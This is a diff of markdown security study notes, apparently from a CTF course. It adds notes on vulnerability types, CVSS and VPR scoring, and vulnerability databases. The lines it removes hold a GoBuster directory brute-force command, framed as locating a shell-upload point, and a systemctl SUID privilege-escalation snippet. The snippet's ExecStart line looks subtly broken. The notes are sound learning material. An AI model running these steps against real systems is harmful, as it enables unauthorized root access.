@@ -1,36 +1,41 @@
-## Use NMAP
+# Vulnerabilities
 
-For more info, visit [nmap room](./../nmap)
+## Types
+- Application Logic
+- Weak or Default Credentials
+- Human-factor
+- Mis-Configuration
+- Operating System
 
-## GoBuster
+## Scoring Vulnerabilities (CVSS - Common Vulnerability Scoring System & VPR - Vulnerability Priority Rating)
+- Vulnerability Management is the process of evaluating, categorising and ultimately remediating threats (vulns) faced by an organization
+- As per stats, only 2% of Vulns will ever get exploited
+- Therefore, it is all about addressing the most dangerous/critical vulns. This is where vuln scoring comes into play. Scoring will be based on the risk and impact it will have on a network or computer system.
+- CVSS introduced in 2005. It asks three questions
+  - How easy is it to exploit the vulnerability ?
+  - Does exploit exists for this ?
+  - How does the vulnerability interfere with CIA triad ?
+### CVSS Scoring
+|Rating|Score|
+|-|-|
+|None|0|
+|Low|0.1-3.9|
+|Medium|4.0-6.9|
+|High|7.0-8.9|
+|Critical|9.0-10.0|
+### Pros/Cons of CVSS
+- Pros:- Has been there for a long time & it is popular. It is free and is recommended by NIST
+- Cons:- No prioritization of vuls is talked about. It relies heavily on exploit being available. the scoring always remain constat even after new developments take place
+### VPR
+- VPR was developed by Tenable. It is Modern.
+- VPR heavily relies on the risk of the vuln to org.
+- If the org is not using a piece of software, the vulns of the software are no meaning and the risk is very low.
+- VPR uses similar scoring range like CVSS
+### Pros/Cons of VPR
+- Pros:- Modern framework; Takes into account about 150 factors when calculating risk;It is risk-driven,orgs can prioritize vulns;scorings are dynamic and they may change as the vuln ages.
+- Cons:- VPR is not open-source.VPR can be adopted only on a commercial platform. VPR does not consider the CIA triad.
 
-- Using a fast directory discovery tool called `GoBuster`, you will locate a directory that you can use to upload a shell to.
-- Lets first scan the website to find any hidden directories. To do this, we are going to use GoBuster.
-- GoBuster is a tool used to brute-force URI's (directories & files), DNS sub-domains and virtual host names.
-- use the following command.
-- `gobuster dir -u http://10.10.131.12:3333 -w /usr/share/wordlists/dirb/common.txt`
-```
--U - username  
--P - password
--c <http-cookies> - specify a cookie for simulating your auth
--p - proxy to use for requests
--e - print the full url's on the console
-
-```
-
-## Using systemctl for privilege escalation if it has a setUID file permission
-
-```
-echo '[Service]
-Type=oneshot
-ExecStart=/bin/sh -c "/root/root.txt > /tmp/output"
-[Install]
-WantedBy=multi-user.target' > /tmp/root.service
-
-/bin/systemctl enable /tmp/root.service
-/bin/systemctl start /tmp/root.service
-
-cat /tmp/output
-
-
-```
+## Vuln Databases
+- NVD (National Vulnerability Database)
+- Exploit-Db
+- NVD displays publically categorized vulns also known as CVE's (common vulnerabilities and exposures)
